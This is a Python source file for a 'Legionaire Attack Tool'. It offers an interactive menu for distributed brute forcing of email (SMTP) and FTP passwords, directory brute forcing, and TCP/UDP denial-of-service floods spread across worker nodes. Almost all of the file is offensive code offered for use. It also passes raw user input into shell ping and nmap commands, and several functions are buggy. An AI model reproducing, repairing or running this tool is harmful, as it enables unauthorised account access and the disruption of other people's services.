##############################################################################
#                                                                            #
#   ----------------------------------------                                 #
#   Legionaire Attack Tool                                                   #
#   V2.0                                                                     #
#   ----------------------------------------                                 #
#   Main Developer:                                                          #
#        -Brandon Hammond                                                    #
#                                                                            #
#                                                                            #
##############################################################################

import os
import sys
import time
import pp
import itertools
import smtplib
import ftplib
import socket
import urllib
import urllib2
from ftplib import FTP

nodenum=0
ppservers=()
jobServer=pp.Server(ppservers=ppservers)

def emailBruteForce(email,server,startPoint):
    #Brute force email
    server=smtplib.SMTP(server,25)
    x=startPoint
    y=0
    while y==0:
        x=x+1
        gen=itertools.product("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()-_+=",repeat=x) #Generate password as tuple
        for password in gen:
            passwordTest=''.join(password) #Convert password from tuple to string for use
            try:
                #Test login
                server.login(email,passwordTest)
                print("Password: %s" % passwordTest)
                y=1
            except:
                #Does nothing, just needed
                doNothing=1
                
def ftpBruteForce(username,server,startPoint):
    #Brute force FTP
    ftp=FTP(server)
    x=startPoint
    y=0
    while y==0:
        x=x+1
        gen=itertools.product("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()-_+=",repeat=x) #Generate password as tuple
        for password in gen:
            passwordTest=''.join(password) #Convert password from tuple to string for use
            try:
                #Test login
                ftp.login(username,passwordTest)
                print("Password: %s" % passwordTest)
                y=1
            except:
                #Does nothing, just needed
                doNothing=1
                
def directoryBruteForce(url,startPoint):
    #Brute force directories
    x=startPoint
    y=0
    while y==0:
        x=x+1
        gen=itertools.product("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()-_+=",repeat=x) #Generate password as tuple
        for password in gen:
            passwordTest=''.join(password) #Convert password from tuple to string for use
            host=url
            path="/"+passwordTest
            try:
                #test URL validity
                conn=httplib.HTTPConnection(host)
                conn.request("HEAD", path)
                ecode=conn.getresponse().status
                if ecode==200:
                    doNothing=0
                elif ecode==404:
                    print(host+path)
                else:
                    doNothing=0
            except:
                print("Error")
                    
def tcpDDoS(server,time):
    #DDoS using TCP
    host,port=server.split(":") #Gets host and port from server
    timeout=time.time()+time
    ddos=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    message="LEGIONNAIRE DDOS"
    x=0
    while time.time()<timeout: #Tests time
        ddos.connect((host,port))
        while x<=10:
            ddos.send(message)
        ddos.close()
        
def udpDDoS(server,time):
    #DDoS using UDP
    host,port=server.split(":") #Gets host and port from server
    timeout=time.time()+time
    ddos=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    message="LEGIONNAIRE DDOS"
    x=0
    while time.time()<timeout: #Tests time
        ddos.connect((host,port))
        while x<=10:
            ddos.send(message)
        ddos.close()
        
print("=")*50
print("Legionaire Attack Tool")
print("v2.0")
print("=")*50
print("1. Start")
print("2. Exit")
print("=")*50
userInput=input("=>")
if userInput==1:
    #Start tool
    os.system("clear")
    print("Type 'help' for help menu...")
    while True:
        userCommand=raw_input("=>")
        if userCommand=="help":
            #Display help menu
            print("-----GENERAL-----")
            print("help - Pulls up this menu")
            print("credits - Pulls up credits")
            print("clear - Clears the screen")
            print("nodes - Display nodes")
            print("nodeadd 'ip' - Add a node")
            print("stats - Display stats")
            print("-----TARGETING-----")
            print("ping 'server' - Ping test")
            print("resolve 'server' - Resolve IP from URL")
            print("smtpfind 'service' - Find services SMTP server")
            print("nmap 'url' - Nmap port scan")
            print("-----BRUTE FORCE-----")
            print("email 'email' 'server' - Brute force email")
            print("ftp 'username' 'server' - Brute force FTP")
            print("sitemap 'url' - Maps directory")
            print("-----DDOS-----")
            print("tcp 'server:port' 'time' - DDoS using TCP")
            print("udp 'server:port' 'time' - DDoS using UDP")
        elif userCommand=="credits":
            #Credits
            print("-----DEVELOPERS-----")
            print("-Brandon Hammond")
            print("-----SPECIAL THANKS-----")
            print("-Frostbyte")
            print("-Psyko Sec")
        elif userCommand=="clear":
            #Clear the screen
            os.system("clear")
        elif userCommand=="nodes":
            #Display nodes
            print("\n".join(ppservers))
        elif "nodeadd" in userCommand:
            #Add a node
            command,node=userCommand.split(" ")
            ppservers=list(ppservers)
            ppservers.append(node)
            ppservers=tuple(ppservers)
            nodenum=nodenum+1
        elif userCommand=="stats":
            #Display stats
            print("Version: ")
            print("v2.0")
            print("Nodes: ")
            print("-\n-".join(ppservers))
        elif "ping" in userCommand:
            #Ping
            try:
                command,server=userCommand.split(" ")
            except:
                print("Missing or extra operand...")
            os.system("ping %s -c 5" % server)
        elif "resolve" in userCommand:
            #Resolve URL to IP
            try:
                command,server=userCommand.split(" ")
            except:
                print("Missing or extra operand...")
            ip=socket.gethostbyname(server)
            print(ip)
        elif "smtpfind" in userCommand:
            #Find SMTP server
            try:
                command,service=userCommand.split(" ")
            except:
                print("Missing or extra operand...")
                #Resume here
                server=urllib2.urlopen("http://legionnaire.x10host.com/service2smtp.php?service=%s" % service)
                print(server)
        elif "nmap" in userCommand:
            try:
                command,url=userCommand.split(" ")
            except:
                print("Missing or extra operand...")
            os.system("nmap %s" % url)
        elif "email" in userCommand:
            #Brute force email
            try:
                command,email,server=userCommand.split(" ")
            except:
                print("Missing or extra operand...")
            x=0
            for i in range(nodenum):
                jobServer.submit(emailBruteForce,(email,server,x,),("itertools","os","sys","smtplib",))
                x=x+1
        elif "ftp" in userCommand:
            #Brute force FTP
            try:
                command,username,server=userCommand.split(" ")
            except:
                print("Missing or extra operand...")
            x=0
            for i in range(nodenum):
                jobServer.submit(ftpBruteForce,(username,server,x,),("itertools","os","sys","ftplib",))
                x=x+1
        elif "sitemap" in userCommand:
            #Brute force FTP
            try:
                command,url=userCommand.split(" ")
            except:
                print("Missing or extra operand...")
            x=0
            for i in range(nodenum):
                jobServer.submit(directoryBruteForce,(url,x,),("itertools","os","sys","httplib",))
                x=x+1
        elif "tcp" in userCommand:
            #DDoS using TCP
            try:
                command,server,time=userCommand.split(" ")
            except:
                print("Missing or extra operand...")
            for i in range(nodenum):
                jobServer.submit(tcpDDoS,(server,time),("socket","os","sys",))
        elif "udp" in userCommand:
            #DDoS using UDP
            try:
                command,server,time=userCommand.split(" ")
            except:
                print("Missing or extra operand...")
            for i in range(nodenum):
                jobServer.submit(udpDDoS,(server,time),("socket","os","sys",))
        else:
            #If invalid comand
            print("Invalid command...")
else:
    #Exit tool
    print("Goodbye...")
